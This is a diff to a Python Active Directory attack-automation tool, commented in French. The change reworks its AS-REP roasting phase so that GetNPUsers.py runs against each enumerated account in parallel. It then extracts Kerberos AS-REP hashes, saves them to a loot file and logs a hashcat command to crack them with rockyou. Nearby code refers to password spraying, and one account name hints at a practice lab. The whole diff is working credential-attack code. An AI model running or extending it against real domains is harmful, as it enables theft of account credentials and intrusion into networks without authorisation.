@@ -1099,22 +1099,48 @@ def spray_reuse(args, state, dc):
                         "meme mdp qu'un autre compte -> re-enum (boucle)", dc)
 
 def phase_asrep(dc, args, state, label=""):
-    """AS-REP roasting : comptes DONT_REQ_PREAUTH -> hash crackable."""
-    if not (args.domain and os.path.isfile(os.path.join(args.loot, "users.txt"))):
+    """AS-REP roasting PAR-USER : pour CHAQUE compte enumere, tente un AS-REQ sans
+    pre-auth (equivaut a 'GetNPUsers.py dom/USER -no-pass -format hashcat').
+    Bien plus fiable que le mode -usersfile : si un compte plante (ex: $331000-...),
+    il n'annule plus tout le lot -> les autres (svc-alfresco...) sont quand meme roastes.
+    Parallelise pour rester rapide ; chaque hash trouve est ensuite cracke par crack_hashes."""
+    if not args.domain:
+        return
+    # liste des comptes a tester : les confirmes en memoire, sinon users.txt
+    users = [u for u in (state.get("users") or []) if u and not u.endswith("$")]
+    if not users:
+        uf = os.path.join(args.loot, "users.txt")
+        if os.path.isfile(uf):
+            users = [l.strip() for l in open(uf, encoding="utf-8", errors="ignore")
+                     if l.strip() and not l.strip().endswith("$")]
+    if not users:
+        return
+    if not have("GetNPUsers.py"):
+        log(f"{C.GR}[i] GetNPUsers.py (impacket) absent -> AS-REP roast saute.{C.X}")
         return
     outfile = os.path.join(args.loot, "asrep.hashes")
-    if have("GetNPUsers.py"):
-        log(f"{C.GR}[i] AS-REP roasting (GetNPUsers, {label})...{C.X}")
-        rc, out, _ = run_cmd(["GetNPUsers.py", f"{args.domain}/", "-no-pass", "-dc-ip", dc,
-                              "-usersfile", os.path.join(args.loot, "users.txt"),
-                              "-format", "hashcat", "-outputfile", outfile], 300)
-        if os.path.isfile(outfile) and os.path.getsize(outfile) > 0:
-            n = len(open(outfile, encoding="utf-8", errors="ignore").read().splitlines())
-            add_finding(state, "HIGH", f"AS-REP roasting : {n} compte(s) sans pre-auth",
-                        f"hashcat -m 18200 {outfile} rockyou.txt", dc)
-            register_hashfile(state, "asrep", outfile)
-    else:
-        log(f"{C.GR}[i] GetNPUsers.py (impacket) absent -> AS-REP roast saute.{C.X}")
+    log(f"{C.GR}[i] AS-REP roasting par-user ({len(users)} comptes, {label})...{C.X}")
+
+    def _roast(u):
+        _, out, _ = run_cmd(["GetNPUsers.py", f"{args.domain}/{u}", "-no-pass",
+                             "-dc-ip", dc, "-format", "hashcat"], 30)
+        m = re.search(r"\$krb5asrep\$[^\s]+", out)
+        return (u, m.group(0)) if m else (u, None)
+
+    found = []
+    with ThreadPoolExecutor(max_workers=min(12, len(users))) as ex:
+        for u, h in ex.map(_roast, users):
+            if h:
+                found.append(h)
+                log(f"    {C.G}[+] AS-REP roastable (sans pre-auth) : {u}{C.X}")
+                board_user(state, u, "AS-REP", "sans pre-auth")
+    if found:
+        uniq = list(dict.fromkeys(found))
+        with open(outfile, "w", encoding="utf-8") as f:
+            f.write("\n".join(uniq) + "\n")
+        add_finding(state, "HIGH", f"AS-REP roasting : {len(uniq)} compte(s) sans pre-auth",
+                    f"hashcat -m 18200 {outfile} rockyou.txt", dc)
+        register_hashfile(state, "asrep", outfile)
 
 # ======================================================================
 # PHASE 2 : ATTAQUE DE MOT DE PASSE (spray lockout-aware)
